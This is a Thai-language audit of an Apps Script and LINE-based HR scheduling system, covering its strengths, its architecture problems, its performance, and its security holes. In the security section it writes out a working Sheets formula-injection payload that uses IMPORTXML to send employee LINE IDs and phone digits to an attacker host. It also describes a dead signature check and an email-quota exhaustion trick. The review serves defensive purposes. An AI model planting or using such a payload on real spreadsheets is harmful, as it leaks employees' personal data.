## 1.1 สิ่งที่ดีจริง และต้องรักษาไว้ ห้ามรื้อ

**(ก) สถาปัตยกรรมแจ้งเตือน 0 บาท — นี่คือหัวใจของระบบ และมันฉลาดจริง**

`apps-script/10_Notify.js` ระบุข้อจำกัดไว้ตรงหัวไฟล์ ระบุว่า LINE นับเงินเฉพาะ push/multicast/broadcast/narrowcast 4 ชนิด แล้วออกแบบให้ทุกการแจ้งเตือนเป็น "การสลับรูป rich menu" ซึ่งไม่อยู่ใน 4 ชนิดนั้น ผลคือแจ้งเตือนได้ไม่จำกัด 0 บาท

และมันไม่ได้ฉลาดแค่ในคอมเมนต์ — `broadcastBadge()` (`10_Notify.js:69-91`) **จัดกลุ่มผู้ใช้ตามเมนูปลายทางก่อน** แล้วยิง `POST /v2/bot/richmenu/bulk/link` แค่ 1–2 ครั้ง ไม่ใช่ 60 ครั้ง ประกาศถึงพนักงานทั้งร้านจึงใช้เวลา 3–10 วินาที ห่างจากลิมิต 6 นาทีของ Apps Script มาก ๆ

เสริมด้วยอีกสามชั้นที่ต่อกันสนิท: `.ics` feed (`10_Notify.js:128-172`) ที่มี HMAC token รายคน + `X-PUBLISHED-TTL` 6 ชั่วโมง + VALARM สองอัน ทำให้มือถือพนักงานเตือนกะให้เองฟรี, อีเมลถึง HR แทน push, และ `safePush` ที่กันโควตาสำรองไว้ **ใครก็ตามที่จะมาแก้ระบบนี้ต่อ ต้องอ่าน `10_Notify.js` ให้จบก่อน**

**(ข) `readTable()` header detection — รอยแผลที่กลายเป็นความรู้**

`apps-script/02_Data.js:56-64` ไม่เชื่อว่าแถวหัวคอลัมน์คือแถวที่ 1 แต่ไล่หาแถวแรกที่มีข้อความ ≥ 2 ช่อง พร้อมคอมเมนต์อธิบายว่าเคยเจออะไร (แถวคำอธิบายผสานเซลล์ทำให้ทุกฟิลด์ว่างเงียบ ๆ — ระบบไม่ error แต่ข้อมูลหายหมด) คอมเมนต์แบบนี้มีค่ามากกว่าโค้ด และ `cellToString_()` ที่แปลง Date ของ Sheets กลับเป็น `yyyy-MM-dd` คือสิ่งเดียวที่ทำให้การเทียบวันที่แบบ string ทั้งระบบทำงานได้จริง

**(ค) ชั้นสิทธิ์ของ API ฝั่ง LIFF ถูกต้องแทบทั้งหมด**

- `verifyIdToken` (`01_LineApi.js:136-152`) ตรวจ token กับ LINE จริง ไม่เชื่อ userId ที่ browser ส่งมา และเช็ก `exp` ซ้ำเอง
- ตรวจสิทธิ์ที่เดียวใน `handleApi_` ก่อนเข้า switch — endpoint ไหนก็ลืมไม่ได้
- **ไม่มี endpoint ไหนอ่าน `empCode` จาก request body เลย** ตัวตนมาจาก `sub` ของ token เท่านั้น
- `publicEmp_` / `publicTicket_` (`06_WebApi.js:55,72`) เป็น allowlist จริง ๆ พร้อมคอมเมนต์ระบุว่ากันอะไรไว้
- `apiReportData_` (`06_WebApi.js:409-413`) เช็ก role ซ้ำในโค้ดสำหรับ R05/R06 พร้อมคอมเมนต์ว่า "HR แก้ชีตนี้ได้ พิมพ์ผิดต้องไม่กลายเป็นข้อมูลรั่ว" — defence in depth ที่ถูกต้อง
- `getOrgChart` แปลง status เป็น boolean `active` แล้ว `apiOrgChart_` ลบทิ้งอีกชั้น — มีคนคิดจริง ๆ ว่าใครควรรู้ว่าเพื่อนร่วมงานถูกพักงาน

**(ง) การกันเดาตัวตนในหน้ายืนยัน**

`findEmployeeByName` ตัดคนลาออกออก (`02_Data.js:183`) เพื่อไม่ให้ใช้หน้านี้เช็กว่าใครเคยทำงานที่นี่, ทุกความล้มเหลวตอบข้อความเดียวกัน (`VERIFY_GENERIC_FAIL`) และที่ไม่ธรรมดาคือ **rate limit ผูกกับ empCode ไม่ใช่ข้อความที่พิมพ์** (`06_WebApi.js:143`) เพราะคนหนึ่งคนมีทั้งชื่อจริงและชื่อเล่น ถ้านับตามข้อความที่พิมพ์คนร้ายจะได้โควตาเดาสองเท่า — เป็นการมองภัยที่ไม่ชัดเจนเลย และมองเห็น

**(จ) งานฝั่งชีตที่เขียนอย่างระวัง**

`generateScheduleFromPattern` แทรกแถวก่อนล้าง (timeout กลางคันจะได้ไม่ทำให้ตารางว่างเปล่า), อ่าน header จากชีตจริงไม่เชื่อ SCHEMA, จับ lock 20 วินาที — `offboardSelectedEmployee` อธิบาย 5 ขั้นตอนก่อนทำ อ้างกฎหมายแรงงาน §115 ว่าทำไมห้ามลบแถว และ §70 เรื่องจ่ายเงินภายใน 3 วัน — `testWebhookUrl` แยกสาเหตุความล้มเหลวได้ 4 แบบพร้อมวิธีแก้ทีละคลิก

**(ฉ) และงานรอบล่าสุด**: `release.sh` ที่บังคับให้ commit ให้หมดก่อน แล้ว build ภาพ → push clasp → สร้าง version → **ชี้ deployment เดิมไป version ใหม่** → tag → push ในคำสั่งเดียว คือ rollback story ที่ใช้ได้จริง ไม่ใช่เอกสาร

## 1.2 สิ่งที่ยังไม่ดี — และรากของปัญหาคืออะไรจริง ๆ

### รากเดียวที่อธิบายปัญหา 70% ของระบบ

**Google Sheet ไฟล์นี้ทำหน้าที่สามอย่างพร้อมกัน: เป็นฐานข้อมูล, เป็นหน้าจอแอดมิน, และเป็นระบบสิทธิ์** สามอย่างนี้ขัดกันเอง

- เป็นฐานข้อมูล → `readTable` ต้องอ่านทั้งแท็บทุกครั้ง
- เป็นหน้าจอแอดมิน → HR ต้องมีสิทธิ์แก้ไฟล์
- เป็นระบบสิทธิ์ → Drive ACL ให้สิทธิ์ได้แค่ระดับ "ทั้งไฟล์"

ผลลัพธ์: **นาทีที่หัวหน้ากะได้สิทธิ์แก้ตารางงาน เขาได้ `lineUserId` ของทุกคน, `phoneLast4` ของทุกคน, เนื้อความร้องเรียนลับทุกเรื่อง (`PRIVACY.HR_ONLY`), ปุ่ม `emergencyBroadcast`, และปุ่ม `offboardSelectedEmployee` ไปด้วยทั้งหมด** — `apps-script/07_Admin.js` มี 28 เมนู และ **ไม่มีเมนูไหนเลยที่เช็ก role** `actor_()` (`07_Admin.js:261`) อ่านอีเมลแค่เพื่อเขียน audit เท่านั้น

นี่คือปัญหาที่ร้ายแรงที่สุดในระบบ และมันไม่ใช่ปัญหาทางเทคนิค — มันคือปัญหาเชิงองค์กรที่แก้ได้ทางเดียว: **สร้าง admin console แล้วถอนสิทธิ์แก้ชีตออกจากทุกคนยกเว้น admin 1–2 คน**

### ปัญหาที่ 2 — งานแอดมินจริงทำบนมือถือไม่ได้เลย แม้แต่ข้อเดียว

Custom menu ของ Apps Script และ `SpreadsheetApp.getUi()` **ไม่ render ในแอป Google Sheets บน iOS และ Android** ดังนั้นคำตอบของ "HR ใช้มือถือทำได้ไหม" คือ **ไม่ได้ทั้ง 28 รายการ** ไม่ใช่ยาก แต่เป็นไปไม่ได้

และงานที่ทำบ่อยที่สุดยังไม่ได้เป็นเมนูด้วยซ้ำ:

- **ตอบเรื่องพนักงาน = 10 ขั้นตอนบนคอมพิวเตอร์** ต้องหาแถวในแท็บ Tickets ที่ยาวขึ้นเรื่อย ๆ (ไม่มี filter view), ขยายคอลัมน์อ่าน `detail`, **เลื่อนขวาผ่านคอลัมน์ `lineUserId` ซึ่งเป็นข้อมูลส่วนบุคคลที่กฎในชีตเองห้ามนำออก** ไปถึงคอลัมน์ `reply` (คอลัมน์ที่ 17 จาก 18), พิมพ์, คลิกกลับมาที่แถวเดิม, เข้าเมนู, ยืนยัน, กด OK — และ **พิมพ์คำตอบเฉย ๆ ไม่ส่งอะไรทั้งสิ้น** ไม่มี onEdit trigger ในระบบเลย
- **อนุมัติลา = ไม่มีเครื่องมือใด ๆ** ไม่มีเมนู ไม่มีฟังก์ชัน ไม่มี API ต้องพิมพ์ลงคอลัมน์เอง 4 ช่อง และพนักงานจะไม่รู้ผลจนกว่าจะบังเอิญเปิดรายงาน R04
- **แก้กะหนึ่งกะ = ต้องจำคำวิเศษ** `generateScheduleFromPattern` (`07_Admin.js:500`) เก็บแถวเดิมไว้เฉพาะเมื่อ `status` เป็นคำว่า `manual` ตัวพิมพ์เล็กเป๊ะ ๆ **หัวหน้ากะที่แก้ตารางวันเสาร์แต่ไม่ได้พิมพ์คำนี้ จะถูกเขียนทับหายไปเงียบ ๆ ในการ generate ครั้งถัดไป ไม่มี warning ไม่มี audit ไม่มี undo** คำนี้ปรากฏในโค้ดและใน dialog บรรทัดเดียว ไม่มีที่อื่น
- **เขียนประกาศ = พิมพ์เอง 18 คอลัมน์** และ `imageUrl` ใช้งานไม่ได้จริงสำหรับคนที่ไม่ใช่ developer เพราะลิงก์แชร์ของ Google Drive ไม่ render เป็น Flex hero

และทุกอีเมลแจ้งเตือน HR (`10_Notify.js:207`) มีปุ่มเดียวคือ "เปิด Google Sheet" ซึ่งบนมือถือจะเปิดแอป Sheets ที่ไม่มีเมนู — HR ที่ได้อีเมล 09:00 น. ทำอะไรไม่ได้เลยจนกว่าจะถึงคอมพิวเตอร์

### ปัญหาที่ 3 — ประสิทธิภาพ: `readTable` อ่านทั้งแท็บ ทุกครั้ง ทุก request

`apps-script/02_Data.js:48` ทำ `getRange(1,1,lastRow,lastCol).getValues()` โดยไม่มี cache ใด ๆ CacheService ถูกใช้แค่ 2 จุดในทั้งระบบ (`02_Data.js:112` และ `10_Notify.js:233`)

เส้นทางที่แย่ที่สุดคือ `apiSchedule_` เมื่อผู้ใช้เป็น HR/admin — **อ่าน Schedule 2 ครั้ง, Shifts 3 ครั้ง, Employees เพิ่มอีก 1 ครั้ง ในหนึ่ง request** (`06_WebApi.js:300,307,308,332` + `02_Data.js:361,362`) หน้า `schedule.html:36` ขอช่วง 3 เดือน = ประมาณ 5,400 แถว × 20 คอลัมน์ = 108,000 เซลล์ อ่านสองรอบ **รวมแล้วเปิดหน้าเดียว 6.5–9 วินาที และส่ง JSON 1–2 MB ไปให้มือถือที่แสดงผลจริงแค่ 10 วัน และใช้แค่ 5 ฟิลด์**

บวกกับต้นทุนคงที่ที่จ่ายทุก request: `/exec` ตอบ 302 ไป googleusercontent.com (= 2 hop), Apps Script dispatch, และ `verifyIdToken` ที่ยิงไป `api.line.me` ใหม่ทุกครั้งโดยไม่ cache — รวม 450–1,300 ms ก่อนอ่านเซลล์แรก และ `app.js:83` ยิง `api('me')` ก่อนเสมอ ทำให้ทุกหน้าเสีย 2 รอบขึ้นไป

**และเพดานที่แก้ด้วยโค้ดไม่ได้: Apps Script จำกัด simultaneous execution ที่ 30** ตอนเปลี่ยนกะคือตอนที่ทุกคนเปิดตารางพร้อมกันพอดี ที่ 60 คน × 2-3 request × request ละ 1-9 วินาที = ชนเพดาน

**แต่ — และนี่คือประเด็นสำคัญ — เพดานนี้ชนเพราะ request ค้างนาน ไม่ใช่เพราะ Sheets ช้าโดยธรรมชาติ** ถ้าลดเหลือ 300-800 ms ต่อ request การเปลี่ยนกะจะเหลือ concurrent 1-2 ตัว **จึงยังไม่ควรย้ายฐานข้อมูล** (ดูข้อ 2.2 ในส่วนที่ 2)

### ปัญหาที่ 4 — ช่องโหว่ความปลอดภัยที่แก้ได้ถูกมาก แต่ยังไม่ได้แก้

**(1) Google Sheets formula injection — ระดับวิกฤต**

`appendRow()` (`02_Data.js:87`) และ `updateRow()` (`02_Data.js:100`) ส่ง string ดิบเข้า Sheets ซึ่งตีความ `=` นำหน้าเป็นสูตรสด **และมีข้อความจากผู้ใช้ที่ยังไม่ได้ยืนยันตัวตนเข้าถึงจุดนี้ได้** — `06_WebApi.js:176` เขียน `firstName + ' ' + last` ดิบ ๆ ลง AuditLog ในเส้นทาง `verify` ซึ่งใครก็ตามที่มีบัญชี LINE เรียกได้ ไม่ต้องเป็นพนักงาน

payload แบบ `=IMPORTXML("https://attacker/?x="&JOIN(",",Employees!A2:N70),"//a")` จะทำงานทันทีที่ HR เปิดชีต โดยไม่ต้องคลิกอะไร และส่ง `lineUserId` กับ `phoneLast4` ของทุกคนออกไป **ทำลายกฎหลักของชีตที่ว่า lineUserId ห้ามออกนอกไฟล์ ด้วยตัวมันเอง** และ `protectSensitive_()` ที่ตั้ง `setWarningOnly(true)` ไม่ได้กันสูตรทำงานเลย

**แก้ประมาณ 6 บรรทัด** ที่จุดเขียนจุดเดียว

**(2) Webhook signature verification เป็น dead code**

`05_Webhook.js:42` อ่านลายเซ็นจาก `e.parameter.sig` ซึ่งเป็น **query string** แต่ LINE ส่งลายเซ็นมาใน header `x-line-signature` เท่านั้น และ Apps Script อ่าน header ไม่ได้ ดังนั้น `sig` เป็น null เสมอ เงื่อนไข `if (sig !== null && ...)` เป็นเท็จเสมอ และ `verifySignature_` ไม่เคยถูกเรียก

**(3) อื่น ๆ**: `apiLeaveCreate_` ไม่มี rate limit เลยทั้งที่ยิงอีเมล HR ทุกครั้ง → พนักงานคนเดียวยิง ~100 ครั้งทำให้ **ระบบเตือนภัยของ HR เงียบทั้งวัน** (โควตา Gmail ฟรี 100/วัน) ซึ่งเป็นช่องทางเดียวที่แจ้งเหตุ brute force, `emergencyBroadcast` ตั้ง `floor = 0` (`10_Notify.js:251`) **ปิด QUOTA_RESERVE ทิ้งพอดีในปุ่มที่อันตรายที่สุด**, `appsscript.json:14` ขอ scope `drive.readonly` ทั้งที่ไม่มีโค้ดใช้ DriveApp เลย บน web app ที่เป็น `ANYONE_ANONYMOUS`

## หมายเหตุปิดท้าย

สองประโยคที่อยากให้จำจากเอกสารนี้:

1. **ปัญหาที่แท้จริงไม่ใช่ "Google Sheets ช้า" แต่คือ "ชีตไฟล์เดียวทำหน้าที่เป็นฐานข้อมูล เป็นหน้าจอแอดมิน และเป็นระบบสิทธิ์พร้อมกัน"** — การย้ายฐานข้อมูลแก้ได้แค่หน้าที่แรก แต่การสร้าง admin console แล้วถอนสิทธิ์แก้ชีตแก้ได้ทั้งสามหน้าที่ ด้วยเครื่องมือที่มีอยู่แล้วและสำรองข้อมูลอยู่แล้ว

2. **ลำดับสำคัญกว่าเทคโนโลยี** — ทำ console ก่อนแล้วค่อยพิจารณาย้ายฐานข้อมูล ถ้าย้ายก่อน วันที่ย้ายเสร็จ HR จะไม่มีหน้าจอทำงานเลยแม้แต่หน้าเดียว และงานเฟส F (ข้อสอบ) ควรทำหลังเฟส C (cache) ไม่ใช่ก่อน ไม่งั้นฟีเจอร์ใหม่จะเปิดตัวมาช้าจนคนไม่อยากใช้
